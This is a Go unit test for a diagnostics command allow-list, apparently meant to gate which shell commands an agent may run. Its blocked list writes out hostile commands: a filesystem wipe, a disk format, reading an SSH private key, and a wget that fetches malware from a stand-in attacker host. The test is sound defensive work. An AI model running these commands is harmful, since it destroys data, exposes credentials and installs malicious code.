package diagnostics

import (
	"testing"
)

func TestIsAllowed_ValidCommands(t *testing.T) {
	allowed := []string{
		"ping -c 1 localhost",
		"nc -zv localhost 5432",
		"netstat -tlnp",
		"ss -tlnp",
		"curl -s https://example.com",
		"ufw status",
		"iptables -L",
		"systemctl status postgresql",
		"ps aux",
		"lsof -i :5432",
		"df -h",
		"free -m",
		"cat /etc/hosts",
		"dpkg -l postgresql",
		"apt list --installed",
		"dig example.com",
		"nslookup example.com",
		"traceroute example.com",
	}
	for _, cmd := range allowed {
		if !IsAllowed(cmd) {
			t.Errorf("expected allowed: %q", cmd)
		}
	}
}

func TestIsAllowed_BlockedCommands(t *testing.T) {
	blocked := []string{
		"rm -rf /",
		"sudo apt-get install foo",
		"systemctl start postgresql",
		"cat /home/user/.ssh/id_rsa",
		"wget -O /tmp/malware http://evil.com/x",
		"reboot",
		"shutdown -h now",
		"mkfs.ext4 /dev/sda1",
	}
	for _, cmd := range blocked {
		if IsAllowed(cmd) {
			t.Errorf("expected blocked: %q", cmd)
		}
	}
}
